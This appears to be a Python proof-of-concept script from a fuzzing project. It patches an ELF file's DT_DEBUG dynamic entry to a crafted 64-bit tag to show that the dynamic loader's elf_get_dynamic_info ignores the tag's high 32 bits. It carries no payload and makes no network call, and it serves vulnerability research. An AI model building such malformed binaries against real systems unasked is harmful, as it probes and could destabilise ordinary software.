#!/usr/bin/env python3
# Craft a PoC: overwrite a DT_DEBUG entry's tag with 0xDEADBEEFFFFFFFFD
# (low32=0xFFFFFFFD -> DT_EXTRATAGIDX slot 2, high32=0xDEADBEEF garbage)
# to prove elf_get_dynamic_info's EXTRATAGIDX branch ignores the high 32 bits
# of a 64-bit d_tag when deciding which l_info[] slot to fill.
import struct, sys

SRC = "/home/garden/PE/Lfuzzer/prac.elf"
DST = "/home/garden/PE/Lfuzzer/prac_extratag_poc.elf"
DT_DEBUG = 21
NEW_TAG = 0xDEADBEEFFFFFFFFD

with open(SRC, "rb") as f:
    data = bytearray(f.read())

e_shoff = struct.unpack_from("<Q", data, 0x28)[0]
e_shentsize, e_shnum = struct.unpack_from("<HH", data, 0x3A)
e_phoff = struct.unpack_from("<Q", data, 0x20)[0]
e_phentsize, e_phnum = struct.unpack_from("<HH", data, 0x36)

# find PT_DYNAMIC (p_type == 2) via program headers
dyn_off = dyn_size = None
for i in range(e_phnum):
    off = e_phoff + i * e_phentsize
    p_type, p_flags, p_offset, p_vaddr, p_paddr, p_filesz, p_memsz, p_align = struct.unpack_from("<IIQQQQQQ", data, off)
    if p_type == 2:  # PT_DYNAMIC
        dyn_off, dyn_size = p_offset, p_filesz
        break

if dyn_off is None:
    print("no PT_DYNAMIC found"); sys.exit(1)

n_entries = dyn_size // 16
patched = False
for i in range(n_entries):
    entry_off = dyn_off + i * 16
    tag, val = struct.unpack_from("<qQ", data, entry_off)
    if tag == DT_DEBUG:
        struct.pack_into("<QQ", data, entry_off, NEW_TAG, val)
        print(f"patched DT_DEBUG entry at file offset 0x{entry_off:x}: tag 21 -> 0x{NEW_TAG:016x}")
        patched = True
        break

if not patched:
    print("no DT_DEBUG entry found to overwrite"); sys.exit(1)

with open(DST, "wb") as f:
    f.write(data)
print("wrote", DST)
